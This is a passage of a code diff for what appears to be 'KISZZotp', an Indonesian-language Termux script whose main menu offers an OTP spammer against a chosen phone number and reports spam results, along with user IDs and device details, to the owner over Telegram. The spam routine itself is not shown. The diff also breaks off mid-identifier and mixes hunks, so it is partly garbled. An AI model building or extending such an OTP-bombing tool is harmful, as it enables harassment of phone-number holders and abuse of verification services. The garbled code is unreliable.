-    console.log(chalk.green('✅ Info berhasil disimpan: ' + info));
-    logActivity(user, 'SET_INFO', info);
-    await notifyOwner('📢 SET INFO', user, 'Info: ' + info);
-    readlineSync.question(chalk.gray('\nTekan Enter...'));
-}
-
-async function main() {
-    checkUpdate();
-
-    console.clear();
-    console.log(chalk.cyan('╔═══════════════════════════════════════════════╗'));
-    console.log(chalk.cyan('║     SELAMAT DATANG DI KISZZotp               ║'));
-    console.log(chalk.cyan('╚═══════════════════════════════════════════════╝\n'));
-    await sleep(1000);
-
-    const userName = await getLoginUser();
-    const termuxId = getID();
-    const device = getDevice();
-    const isOwner = userName.toLowerCase() === 'kiszzaja';
-    const isPartner = isApp(termuxId);
-
-    if (!isOwner) {
-        if (!isApp(termuxId)) {
-            console.log(chalk.yellow('\n🔐 Memerlukan approval owner.'));
-            if (!await reqApp(userName, termuxId, device)) {
-                console.log(chalk.red('❌ Akses ditolak.'));
-                process.exit(1);
-            }
-        } else {
-            console.log(chalk.green('\n✅ Sudah terdaftar sebagai partner!'));
-            logActivity(userName, 'LOGIN', '');
-            await notifyOwner('🔓 LOGIN', userName, '');
-            await sleep(1000);
-        }
-    } else {
-        console.log(chalk.green('\n👑 Owner mode!'));
         await sleep(1000);
     }
 
-    let offset = 0;
-    (async function pollTelegram() {
-        while (true) {
-            if (isOwner) {
-                try {
-                    const updates = await getUpd(offset);
-                    for (const u of updates) {
-                        offset = u.update_id + 1;
-                        if (u.message && u.message.text) {
-                            const text = u.message.text;
-                            const fromId = u.message.from.id;
-                            if (fromId == C.CHAT_ID) {
-                                if (text.startsWith('/setstatus')) {
-                                    const parts = text.split(' ');
-                                    if (parts.length < 3) {
-                                        await sendTG('❌ Format: /setstatus <id> <status>', null);
-                                        continue;
-                                    }
-                                    const targetId = parts[1].trim();
-                                    const status = parts.slice(2).join(' ');
-                                    try {
-                                        let sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
-                                        sd[targetId] = status;
-                                        fs.writeFileSync('status.json', JSON.stringify(sd, null, 2));
-                                        await sendTG('✅ Status *' + targetId + '* -> *' + status + '*', null);
-                                        logActivity('OWNER', 'SET_STATUS', targetId + ' -> ' + status);
-                                    } catch (e) {
-                                        await sendTG('❌ Gagal: ' + e.message, null);
-                                    }
-                                } else if (text.startsWith('/getstatus')) {
-                                    const parts = text.split(' ');
-                                    if (parts.length < 2) {
-                                        await sendTG('❌ Format: /getstatus <id>', null);
-                                        continue;
-                                    }
-                                    const targetId = parts[1].trim();
-                                    try {
-                                        const sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
-                                        const status = sd[targetId] || 'Gratisan';
-                                        await sendTG('📌 Status *' + targetId + '*: *' + status + '*', null);
-                                    } catch (e) {
-                                        await sendTG('❌ Gagal: ' + e.message, null);
-                                    }
-                                } else if (text.startsWith('/help')) {
-                                    await sendTG('📋 *Command Owner:*\n/setstatus <id> <status>\n/getstatus <id>\n/help', null);
-                                } else {
-                                    await sendTG('❌ Command tidak dikenali. Ketik /help', null);
-                                }
-                            }
-                        }
-                    }
-                } catch (e) {}
+    const laporan = `📱 Nomor: ${phone}\n📤 Total: ${otp.length}\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`;
+    console.log('\n========== LAPORAN ==========');
+    console.log(laporan);
+    console.log('===============================\n');
+
+    await notifyOwner(`📊 *Hasil Spam dari ${user}* (${termuxId})\n${laporan}`);
+
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
+}
+
+function halamanLaporBug(user, termuxId) {
+    console.clear();
+    console.log(chalk.yellow(`
+╔═══════════════════════════════════════════════╗
+║         🐛  HALAMAN LAPOR BUG               ║
+╚═══════════════════════════════════════════════╝
+`));
+    console.log(chalk.white(`📱 Nomor Owner: ${CONFIG.OWNER_NUMBER}`));
+    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));
+
+    const confirm = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
+    if (confirm.toLowerCase() === 'y') {
+        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.%0A%0ADeskripsi%3A%20`;
+        execSync(`termux-open-url "${url}"`);
+        notifyOwner(`🐛 *${user}* (${termuxId}) membuka lapor bug.`);
+    }
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
+}
+
+async function halamanCekUpdate(user, termuxId) {
+    console.clear();
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║         🔄  HALAMAN CEK UPDATE              ║
+╚═══════════════════════════════════════════════╝
+`));
+    console.log(chalk.green(`✅ Versi terbaru: ${CONFIG.VERSION}`));
+    console.log(chalk.gray('Anda sudah menggunakan versi terbaru.'));
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
+}
+
+async function main() {
+    console.clear();
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║     SELAMAT DATANG DI KISZZotp               ║
+╚═══════════════════════════════════════════════╝
+`));
+
+    const userName = getUserName();
+    const termuxId = getTermuxId();
+    const device = getDeviceInfo();
+    const isOwner = userName.toLowerCase() === 'kiszz';
+
+    if (!isOwner) {
+        if (!isApproved(termuxId)) {
+            console.log(chalk.yellow('\n🔐 Script ini memerlukan approval dari owner.'));
+            const approved = await requestApproval(userName, termuxId, device);
+            if (!approved) {
+                console.log(chalk.red('❌ Akses ditolak. Script akan keluar.'));
+                process.exit(1);
             }
-            await sleep(2000);
+        } else {
+            console.log(chalk.green('\n✅ Anda sudah terdaftar. Selamat datang kembali!'));
+            await notifyOwner(`👤 *${userName}* (${termuxId}) login kembali.`);
+            await sleep(1500);
         }
-    })();
+    } else {
+        console.log(chalk.green('\n👑 Owner mode aktif. Tidak perlu approval.'));
+        await sleep(1500);
+    }
 
     while (true) {
-        const status = getStat(isOwner, termuxId);
+        const status = getStatus(isOwner);
         showHeader(userName, status, termuxId, device);
-        showMenu(isOwner);
-        const maxMenu = isOwner ? 8 : 8;
-        const choice = readlineSync.question(chalk.cyan('\nPilih menu [1-' + maxMenu + ']: '));
+        showMenu();
+
+        const choice = readlineSync.question(chalk.cyan('Pilih menu [1-4]: '));
+
         switch (choice) {
             case '1':
-                await spam(userName, termuxId, isOwner, isPartne
-                           }
+                await halamanSpammer(userName, termuxId);
+                break;
+            case '2':
+                halamanLaporBug(userName, termuxId);
+                break;
+            case '3':
+                await halamanCekUpdate(userName, termuxId);
+                break;
+            case '4':
+                console.log(chalk.green('\n👋 Terima kasih telah menggunakan KISZZotp!'));
+                await notifyOwner(`👋 *${userName}* (${termuxId}) keluar.`);
+                process.exit(0);
+            default:
+                console.log(chalk.red('❌ Pilihan tidak valid!'));
+                await sleep(1000);
+        }
+    }
+}
+
+main().catch(err => console.error(chalk.red('❌ Error:', err.message)));
